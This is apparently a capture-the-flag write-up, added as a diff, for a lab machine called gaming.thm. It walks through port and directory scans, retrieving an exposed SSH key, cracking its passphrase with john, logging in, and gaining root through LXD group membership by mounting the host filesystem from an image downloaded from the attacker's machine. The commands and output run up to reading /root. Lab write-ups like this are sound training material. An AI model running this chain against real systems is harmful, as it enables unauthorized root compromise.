@@ -1,0 +1,229 @@
+## Nmap Tcp scan
+```
+# Nmap 7.95 scan initiated Sun Apr 27 23:16:19 2025 as: /usr/lib/nmap/nmap -sC -sV -p- -vv -T4 -oA tcpscan-gaming gaming.thm
+Nmap scan report for gaming.thm (10.10.98.96)
+Host is up, received echo-reply ttl 63 (0.18s latency).
+Scanned at 2025-04-27 23:16:19 +08 for 373s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrmafoLXloHrZgpBrYym3Lpsxyn7RI2PmwRwBsj1OqlqiGiD4wE11NQy3KE3Pllc/C0WgLBCAAe+qHh3VqfR7d8uv1MbWx1mvmVxK8l29UH1rNT4mFPI3Xa0xqTZn4Iu5RwXXuM4H9OzDglZas6RIm6Gv+sbD2zPdtvo9zDNj0BJClxxB/SugJFMJ+nYfYHXjQFq+p1xayfo3YIW8tUIXpcEQ2kp74buDmYcsxZBarAXDHNhsEHqVry9I854UWXXCdbHveoJqLV02BVOqN3VOw5e1OMTqRQuUvM5V4iKQIUptFCObpthUqv9HeC/l2EZzJENh+PmaRu14izwhK0mxL
+|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEaXrFDvKLfEOlKLu6Y8XLGdBuZ2h/sbRwrHtzsyudARPC9et/zwmVaAR9F/QATWM4oIDxpaLhA7yyh8S8m0UOg=
+|   256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOLrnjg+MVLy+IxVoSmOkAtdmtSWG0JzsWVDV2XvNwrY
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: House of danak
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Apr 27 23:22:32 2025 -- 1 IP address (1 host up) scanned in 373.66 seconds
+```
+
+
+## Nmap Udp scan
+```
+# Nmap 7.95 scan initiated Sun Apr 27 23:16:30 2025 as: /usr/lib/nmap/nmap -sU -vv -oA udpscan-gaming gaming.thm
+Increasing send delay for 10.10.98.96 from 400 to 800 due to 11 out of 11 dropped probes since last increase.
+Nmap scan report for gaming.thm (10.10.98.96)
+Host is up, received echo-reply ttl 63 (0.18s latency).
+Scanned at 2025-04-27 23:16:31 +08 for 1085s
+Not shown: 999 closed udp ports (port-unreach)
+PORT   STATE         SERVICE REASON
+68/udp open|filtered dhcpc   no-response
+
+Read data files from: /usr/share/nmap
+# Nmap done at Sun Apr 27 23:34:36 2025 -- 1 IP address (1 host up) scanned in 1086.20 seconds
+```
+
+
+## Gobuster, juicy directory results
+```
+┌──(kali㉿kali)-[~/thm/gaming]
+└─$ gobuster dir -u http://gaming.thm -w ./raft-medium-directories.txt -o gaming-med-dir.out             
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://gaming.thm
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                ./raft-medium-directories.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/uploads              (Status: 301) [Size: 310] [--> http://gaming.thm/uploads/]
+/secret               (Status: 301) [Size: 309] [--> http://gaming.thm/secret/]
+```
+
+
+## Get Secret key
+```
+┌──(kali㉿kali)-[~/thm/gaming]
+└─$ curl http://gaming.thm/secret/secretKey 
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
+
+..snipped..
+-----END RSA PRIVATE KEY-----
+```
+
+
+## There is confidential info being disclosed on http website
+```
+view-source:http://gaming.thm/index.html
+</body>
+<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
+</html>
+```
+
+
+## Bruteforce ssh passphrase via john
+```
+┌──(kali㉿kali)-[~/thm/gaming]
+└─$ john --wordlist=./dict.lst secretKey.hash                             
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+letmein          (./secretKey)     
+1g 0:00:00:00 DONE (2025-04-27 23:39) 12.50g/s 2775p/s 2775c/s 2775C/s baseball..starwars
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+
+## Change secret key passphrase to none
+```
+┌──(kali㉿kali)-[~/thm/gaming]
+└─$ ssh-keygen -p -N "" -f ./secretKey
+Key has comment ''
+Your identification has been saved with the new passphrase.
+```
+
+
+## Login as john via empty passphrase
+```
+┌──(kali㉿kali)-[~/thm/gaming]
+└─$ ssh -i secretKey john@gaming.thm       
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)
+..snipped..
+
+Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
+john@exploitable:~$ 
+```
+
+
+## Lxc possible privilege escalation 
+```
+john@exploitable:~$ id
+uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+
+john@exploitable:~$ lxc list
++------+-------+------+------+------+-----------+
+| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
++------+-------+------+------+------+-----------+
+
+john@exploitable:/tmp$ wget http://10.14.102.34/alpine-v3.13-x86_64-20210218_0139.tar.gz
+
+john@exploitable:/tmp$ wget http://10.14.102.34/alpine-v3.13-x86_64-20210218_0139.tar.gz
+--2025-04-27 16:11:03--  http://10.14.102.34/alpine-v3.13-x86_64-20210218_0139.tar.gz
+Connecting to 10.14.102.34:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3259593 (3.1M) [application/gzip]
+Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’
+
+alpine-v3.13-x86_64-20210218_0139.tar.gz      100%[================================================================================================>]   3.11M   825KB/s    in 3.9s    
+
+2025-04-27 16:11:07 (825 KB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]
+
+john@exploitable:/tmp$ ls -Flah
+total 3.2M
+drwxrwxrwt 10 root root 4.0K Apr 27 16:11 ./
+drwxr-xr-x 24 root root 4.0K Feb  5  2020 ../
+-rw-rw-r--  1 john john 3.2M Apr 27 16:09 alpine-v3.13-x86_64-20210218_0139.tar.gz
+..snipped..
+
+john@exploitable:/tmp$ lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
+
+john@exploitable:/tmp$ lxc image list
++---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
++---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Apr 27, 2025 at 4:37pm (UTC) |
++---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+
+john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to ignite
+
+john@exploitable:/tmp$ lxc start ignite
+
+john@exploitable:/tmp$ lxc exec ignite /bin/sh
+~ # 
+```
+
+
+## Access host FS
+```
+john@exploitable:/tmp$ lxc exec ignite /bin/sh
+~ # cd /mnt/root
+/mnt/root # ls -Flah
+total 2G     
+drwxr-xr-x   24 root     root        4.0K Feb  5  2020 ./
+drwxr-xr-x    3 root     root        4.0K Apr 27 16:40 ../
+drwxr-xr-x    2 root     root        4.0K Feb  5  2020 bin/
+drwxr-xr-x    3 root     root        4.0K Feb  5  2020 boot/
+drwxr-xr-x    2 root     root        4.0K Feb  5  2020 cdrom/
+drwxr-xr-x   17 root     root        3.6K Apr 27 15:08 dev/
+drwxr-xr-x   93 root     root        4.0K Jul 27  2020 etc/
+drwxr-xr-x    3 root     root        4.0K Feb  5  2020 home/
+lrwxrwxrwx    1 root     root          33 Feb  5  2020 initrd.img -> boot/initrd.img-4.15.0-76-generic
+lrwxrwxrwx    1 root     root          33 Feb  5  2020 initrd.img.old -> boot/initrd.img-4.15.0-76-generic
+drwxr-xr-x   22 root     root        4.0K Feb  5  2020 lib/
+drwxr-xr-x    2 root     root        4.0K Aug  5  2019 lib64/
+drwx------    2 root     root       16.0K Feb  5  2020 lost+found/
+drwxr-xr-x    2 root     root        4.0K Aug  5  2019 media/
+drwxr-xr-x    2 root     root        4.0K Aug  5  2019 mnt/
+drwxr-xr-x    2 root     root        4.0K Aug  5  2019 opt/
+dr-xr-xr-x  120 root     root           0 Apr 27 15:07 proc/
+drwx------    3 root     root        4.0K Feb  5  2020 root/
+drwxr-xr-x   27 root     root         920 Apr 27 16:39 run/
+drwxr-xr-x    2 root     root       12.0K Feb  5  2020 sbin/
+drwxr-xr-x    4 root     root        4.0K Feb  5  2020 snap/
+drwxr-xr-x    2 root     root        4.0K Aug  5  2019 srv/
+-rw-------    1 root     root        2.0G Feb  5  2020 swap.img
+dr-xr-xr-x   13 root     root           0 Apr 27 15:08 sys/
+drwxrwxrwt   10 root     root        4.0K Apr 27 16:39 tmp/
+drwxr-xr-x   10 root     root        4.0K Aug  5  2019 usr/
+drwxr-xr-x   14 root     root        4.0K Feb  5  2020 var/
+lrwxrwxrwx    1 root     root          30 Feb  5  2020 vmlinuz -> boot/vmlinuz-4.15.0-76-generic
+lrwxrwxrwx    1 root     root          30 Feb  5  2020 vmlinuz.old -> boot/vmlinuz-4.15.0-76-generic
+
+/mnt/root # cd root
+
+/mnt/root/root # ls -Flah
+total 32K    
+drwx------    3 root     root        4.0K Feb  5  2020 ./
+drwxr-xr-x   24 root     root        4.0K Feb  5  2020 ../
+-rw-------    1 root     root          42 Feb  5  2020 .bash_history
+-rw-r--r--    1 root     root        3.0K Apr  9  2018 .bashrc
+-rw-r--r--    1 root     root         148 Aug 17  2015 .profile
+drwx------    2 root     root        4.0K Feb  5  2020 .ssh/
+-rw-------    1 root     root        1.1K Feb  5  2020 .viminfo
+-rw-r--r--    1 root     root          33 Feb  5  2020 root.txt
+
+/mnt/root/root # cat root.txt
+```
